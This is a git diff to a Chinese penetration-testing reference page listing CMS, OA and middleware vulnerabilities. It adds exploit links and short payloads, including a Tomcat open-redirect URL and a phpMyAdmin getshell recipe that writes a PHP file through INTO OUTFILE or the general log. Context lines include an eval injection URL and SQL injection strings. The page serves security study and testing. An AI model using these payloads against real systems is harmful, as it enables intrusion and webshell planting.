@@ -25,6 +25,7 @@
     * [泛微](#泛微)
     * [致远](#致远)
     * [通达](#通达)
+    * [信呼](#信呼)
 
 * **框架和中间件**
     * [ActiveMQ](#activemq)
@@ -83,7 +84,7 @@
 
 **什么是 CMS**
 
-内容管理系统 (CMS) 是一种存储所有数据 (如文本,照片,音乐,文档等) 并在您的网站上提供的软件. 它有助于编辑,发布和修改网站的内容.
+内容管理系统 (CMS) 是一种存储所有数据 (如文本,照片,音乐,文档等) 并在你的网站上提供的软件. 它有助于编辑,发布和修改网站的内容.
 
 **工具包**
 - [SecWiki/CMS-Hunter](https://github.com/SecWiki/CMS-Hunter) - CMS 漏洞测试用例集合
@@ -158,9 +159,9 @@
 > 官网 : https://www.drupal.org/
 
 **存在该环境的靶场**
-- [DC: 1](../../../实验/VulnHub/DC/DC1-WalkThrough.md)
-- [DC: 7](../../../实验/VulnHub/DC/DC7-WalkThrough.md)
-- [DC: 8](../../../实验/VulnHub/DC/DC8-WalkThrough.md)
+- [DC: 1](../../../实验/靶机/VulnHub/DC/DC1-WalkThrough.md)
+- [DC: 7](../../../实验/靶机/VulnHub/DC/DC7-WalkThrough.md)
+- [DC: 8](../../../实验/靶机/VulnHub/DC/DC8-WalkThrough.md)
 
 **CVE-2014-3704 “Drupalgeddon” SQL 注入漏洞**
 - 简介
@@ -281,7 +282,7 @@ ECShop 是一款 B2C 独立网店系统,适合企业及个人快速构建个性�
 > 官网 : https://www.joomla.org/
 
 **存在该环境的靶场**
-- [DC: 3](../../../实验/VulnHub/DC/DC3-WalkThrough.md)
+- [DC: 3](../../../实验/靶机/VulnHub/DC/DC3-WalkThrough.md)
 
 **工具**
 - [rezasp/joomscan](https://github.com/rezasp/joomscan) - 效果很差,没啥用
@@ -337,6 +338,16 @@ ECShop 是一款 B2C 独立网店系统,适合企业及个人快速构建个性�
 - POC | Payload | exp
 
     - `admin/column/save.php?name=123&action=editor&foldername=upload&module=22;@eval($_POST[1]);/*`
+
+---
+
+## October
+
+> 官网: http://octobercms.com
+
+**October CMS 1.0.412 - Multiple Vulnerabilities**
+- POC | Payload | exp
+    - [October CMS 1.0.412 - Multiple Vulnerabilities](https://www.exploit-db.com/exploits/41936)
 
 ---
 
@@ -410,9 +421,9 @@ ECShop 是一款 B2C 独立网店系统,适合企业及个人快速构建个性�
 WordPress 是一个开源的内容管理系统(CMS),允许用户构建动态网站和博客.
 
 **存在该环境的靶场**
-- [DC: 2](../../../实验/VulnHub/DC/DC2-WalkThrough.md)
-- [DC: 6](../../../实验/VulnHub/DC/DC6-WalkThrough.md)
-- [symfonos1-WalkThrough](../../../实验/VulnHub/symfonos/symfonos1-WalkThrough.md)
+- [DC: 2](../../../实验/靶机/VulnHub/DC/DC2-WalkThrough.md)
+- [DC: 6](../../../实验/靶机/VulnHub/DC/DC6-WalkThrough.md)
+- [symfonos1-WalkThrough](../../../实验/靶机/VulnHub/symfonos/symfonos1-WalkThrough.md)
 
 **搭建教程**
 - [WordPress 搭建](../../../../运维/Linux/Power-Linux.md#WordPress)
@@ -595,7 +606,7 @@ data:  loginid=CasterJs&password=CasterJs&clienttype=Webclient&clientver=4.5&lan
 - `/seeyon/index.jsp`
 - `seeyon`
 
-**致远OA A6 test.jsp sql注入漏洞**
+**致远 OA A6 test.jsp sql 注入漏洞**
 - 文章
     - [用友致远A6 OA存在sql注入并拿shell](https://www.pa55w0rd.online/yyoa/)
 
@@ -605,11 +616,11 @@ data:  loginid=CasterJs&password=CasterJs&clienttype=Webclient&clientver=4.5&lan
     www.test.com/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20@@basedir)
     ```
 
-**致远OA帆软报表组件前台XXE漏洞**
+**致远 OA 帆软报表组件前台 XXE 漏洞**
 - 文章
     - [致远OA帆软报表组件前台XXE漏洞(0day)挖掘过程](https://landgrey.me/blog/8/)
 
-**帆软报表v8.0 Getshell漏洞**
+**帆软报表 v8.0 Getshell 漏洞**
 - 文章
     - [帆软报表v8.0 Getshell漏洞分析](http://foreversong.cn/archives/1378)
 
@@ -633,19 +644,20 @@ data:  loginid=CasterJs&password=CasterJs&clienttype=Webclient&clientver=4.5&lan
 - `/ispirit/interface/gateway.php`
 - `/mac/gateway.php`
 
-**通达OA 任意用户登录漏洞**
+**通达 OA 任意用户登录漏洞**
 - 影响版本
-    - 通达OA 2017
-    - 通达OA V11.X--V11.5
+    - 通达 OA 2017
+    - 通达 OA V11.X--V11.5
 
 - 文章
     - [通达OA < 11.5任意用户登录漏洞分析](https://mp.weixin.qq.com/s/yJuLhC1GxkMbGL0mRORIoA)
     - [通达OA 任意用户登录漏洞（匿名RCE）分析](https://www.zrools.org/2020/04/23/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E9%80%9A%E8%BE%BEOA-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%8C%BF%E5%90%8DRCE%EF%BC%89%E5%88%86%E6%9E%90/)
+    - [通达OA<11.5任意用户登陆另一处利用方法分析](https://mp.weixin.qq.com/s/I3dtd2ORNo_-vR9zWgnJjw)
 
 - POC | Payload | exp
     - [NS-Sp4ce/TongDaOA-Fake-User](https://github.com/NS-Sp4ce/TongDaOA-Fake-User)
 
-**通达OA 任意文件上传漏洞+本地文件包含漏洞**
+**通达 OA 任意文件上传漏洞+本地文件包含漏洞**
 - POC | Payload | exp
     - [jas502n/OA-tongda-RCE](https://github.com/jas502n/OA-tongda-RCE)
     ```
@@ -659,6 +671,17 @@ data:  loginid=CasterJs&password=CasterJs&clienttype=Webclient&clientver=4.5&lan
 
     json={"url":"/general/../../mysql5/my.ini"}
     ```
+
+---
+
+## 信呼
+
+**信呼 OA 存储型 XSS**
+- 影响版本
+    - 信呼 v1.9.0~1.9.1
+
+- 文章
+    - [信呼OA存储型XSS 0day复现](https://xz.aliyun.com/t/7887)
 
 ---
 
@@ -1238,10 +1261,10 @@ shiro 的漏洞参考 https://issues.apache.org/jira/projects/SHIRO/issues
 - [Shiro 100 Key](https://mp.weixin.qq.com/s/sclSe2hWfhv8RZvQCuI8LA)
 
 **工具**
-- [sv3nbeast/ShiroScan](https://github.com/sv3nbeast/ShiroScan) - Shiro<=1.2.4反序列化,一键检测工具
+- [sv3nbeast/ShiroScan](https://github.com/sv3nbeast/ShiroScan) - Shiro<=1.2.4 反序列化,一键检测工具
 - [wyzxxz/shiro_rce](https://github.com/wyzxxz/shiro_rce) - shiro rce 反序列 命令执行 一键工具
-- [feihong-cs/ShiroExploit](https://github.com/feihong-cs/ShiroExploit) - shiro550/721漏洞检测工具GUI版本
-- [bigsizeme/shiro-check](https://github.com/bigsizeme/shiro-check) -  Shiro反序列化检查 Burp插件
+- [feihong-cs/ShiroExploit](https://github.com/feihong-cs/ShiroExploit) - shiro550/721 漏洞检测工具GUI版本
+- [bigsizeme/shiro-check](https://github.com/bigsizeme/shiro-check) - Shiro反序列化检查 Burp 插件
 
 **指纹**
 - `set-Cookie: rememberMe=deleteMe`
@@ -1349,6 +1372,7 @@ Solr 的漏洞参考 https://issues.apache.org/jira/projects/SOLR/issues
 
 - POC | Payload | exp
     - [jas502n/CVE-2019-0193](https://github.com/jas502n/CVE-2019-0193)
+    - [1135/solr_exploit](https://github.com/1135/solr_exploit)
 
 **CVE-2019-12409**
 - POC | Payload | exp
@@ -1777,6 +1801,28 @@ base64 编码，口令形式为 username:password
     use exploit/multi/http/tomcat_jsp_upload_bypass
     ```
 
+**CVE-2018-11784 Tomcat URL跳转漏洞**
+- 简介
+
+    当 Apache Tomcat 版本 9.0.0.M1 到 9.0.11、8.5.0 到 8.5.33 和 7.0.23 到 7.0.90 中的默认 servlet 返回到一个目录的重定向（例如，当用户请求'/foo'时重定向到'/foo/’），一个特制的 URL 可用于导致重定向生成到攻击者选择的任何 URI。
+
+- 影响版本
+    - Apache Tomcat 9.0.0.M1 ~ 9.0.11
+    - Apache Tomcat 8.5.0 ~ 8.5.33
+    - Apache Tomcat 7.0.23 ~ 7.0.90
+
+- 相关文章
+    - [Tomcat URL跳转漏洞【CVE-2018-11784】](https://mp.weixin.qq.com/s/9SFInsxPkuNcaONx8CFSaQ)
+
+- POC | Payload | exp
+    ```
+    http://[ip:port]//[baidu.com]/..;/[可访问目录/可访问目录]
+    ```
+    默认存在的 docs 目录也可以被利用，例
+    ```
+    http://[ip:port]//[baidu.com]/..;/docs/images
+    ```
+
 **CVE-2019-0232**
 - 简介
 
@@ -2052,7 +2098,7 @@ oracle 版本号是真的乱,Weblogic 数据库版本号请看维基百科 [Orac
     - [jas502n/CNVD-C-2019-48814](https://github.com/jas502n/CNVD-C-2019-48814)
     - [black-mirror/Weblogic](https://github.com/black-mirror/Weblogic) - Weblogic CVE-2019-2725 CVE-2019-2729 Getshell 命令执行
 
-**CVE-2019-2890 WebLogic 反序列化RCE**
+**CVE-2019-2890 WebLogic 反序列化 RCE**
 - 简介
 
     2019年10月16日，WebLogic 官方发布了安全补丁公告，修复了包含 CVE-2019-2890 等高危漏洞。Weblogic 在利用 T3 协议进行远程资源加载调用时，默认会进行黑名单过滤以保证反序列化安全。漏洞 CVE-2019-2890 绕过了 Weblogic 的反序列化黑名单，使攻击者可以通过 T3 协议对存在漏洞的 Weblogic 组件实施远程攻击，但该漏洞利用条件较高，官方也归类为需要身份认证。
@@ -2083,6 +2129,7 @@ oracle 版本号是真的乱,Weblogic 数据库版本号请看维基百科 [Orac
 
 - POC | Payload | exp
     - [jas502n/CVE-2020-2551](https://github.com/jas502n/CVE-2020-2551)
+    - [Y4er/CVE-2020-2551](https://github.com/Y4er/CVE-2020-2551)
 
 **CVE-2020-2555 Oracle Coherence 反序列化漏洞分析**
 - 简介
@@ -2209,6 +2256,7 @@ FCKeditor/_samples/asp/sample04.asp
 - [wyzxxz/fastjson_rce_tool](https://github.com/wyzxxz/fastjson_rce_tool) - fastjson rce 命令执行综合利用工具，一键操作,fastjson remote code execute poc
 - [c0ny1/FastjsonExploit](https://github.com/c0ny1/FastjsonExploit) - fastjson漏洞快速利用框架
 - [Lonely-night/fastjson_gadgets_scanner](https://github.com/Lonely-night/fastjson_gadgets_scanner) - scanner 扫描反编译生成的源文件
+- [p1g3/Fastjson-Scanner](https://github.com/p1g3/Fastjson-Scanner) - a burp extension to find where use fastjson
 
 ---
 
@@ -2542,6 +2590,16 @@ Atlassian Crowd 是一套基于 Web 的单点登录系统。该系统为多用�
 
 ---
 
+## FlySpray
+
+> 官网 : http://www.flyspray.org/
+
+**XSRF Stored FlySpray 1.0-rc4 (XSS2CSRF add admin account)**
+- POC | Payload | exp
+    - [FlySpray 1.0-rc4 - Cross-Site Scripting / Cross-Site Request Forgery](https://www.exploit-db.com/exploits/41918)
+
+---
+
 ## Harbor
 
 > 官网 : https://goharbor.io/
@@ -2853,6 +2911,26 @@ Jupyter Notebook（此前被称为 IPython notebook）是一个交互式笔记�
 **文章**
 - [phpMyadmin各版本漏洞](https://www.cnblogs.com/xishaonian/p/7627125.html) - 2/3 老版本的漏洞
 
+**通过 phpmyadmin 来 getshell**
+- 确认绝对路径
+
+    利用 log 变量,猜绝对路径
+
+    ![](../../../../../assets/img/安全/笔记/RedTeam/后渗透/权限提升/1.png)
+
+    或者直接查询 `select @@basedir;`
+
+    直接 SQL 写文件 `select '<?php phpinfo(); ?>' INTO OUTFILE 'C:/phpStudy/PHPTutorial/WWW/a.php';`
+
+    如果 file_priv 为 null,那么是写不了的,可以尝试使用日志写马
+    ```sql
+    set global general_log='on';
+    set global general_log_file='C:/phpStudy/PHPTutorial/WWW/a.php';
+    select '<?php phpinfo(); ?>';
+    set global general_log=off;
+    ```
+    参考 : [phpMyAdmin新姿势getshell](https://zhuanlan.zhihu.com/p/25957366)
+
 **CVE-2016-5734 4.0.x—4.6.2 远程代码执行漏洞**
 - 简介
 
@@ -3030,4 +3108,5 @@ zabbix 是一款服务器监控软件,其由 server、agent、web 等模块组�
 
 - 文章
     - [zabbix latest.php SQL注入漏洞 (CVE-2016-10134) ](https://vulhub.org/#/environments/zabbix/CVE-2016-10134/)
-    - [记一次zabbix安装及漏洞利用getshell全过程 ](https://xz.aliyun.com/t/6874)
+    - [记一次zabbix安装及漏洞利用getshell全过程](https://xz.aliyun.com/t/6874)
+    - [Zabbix sql注入漏洞复现（CVE-2016-10134）](https://mp.weixin.qq.com/s/Gi3NMbZcgMutE8mNqCmNAw)
